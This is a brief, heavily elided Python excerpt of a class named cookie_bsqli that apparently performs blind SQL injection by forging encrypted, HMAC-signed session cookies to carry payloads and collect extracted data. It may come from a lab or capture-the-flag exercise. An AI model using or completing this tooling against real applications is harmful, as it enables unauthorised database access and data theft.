...
class cookie_bsqli:
	def __init__(self):
		...
		self.aes = Aes(get_key(self.session))
		self.exfil_data = {}
	...
	def __send_payload(self, payload_fstr, pos, ch):
		...
		"""
		encrypted_nval = self.aes.encrypt(json_nval, iv)
		...
		"""
		cookie_dict['value'] = b64_encrypted_nval
		cookie_dict['mac'] = hmac.new(self.aes.key, (cookie_dict['iv']+cookie_dict['value']).encode(), hashlib.sha256).hexdigest()
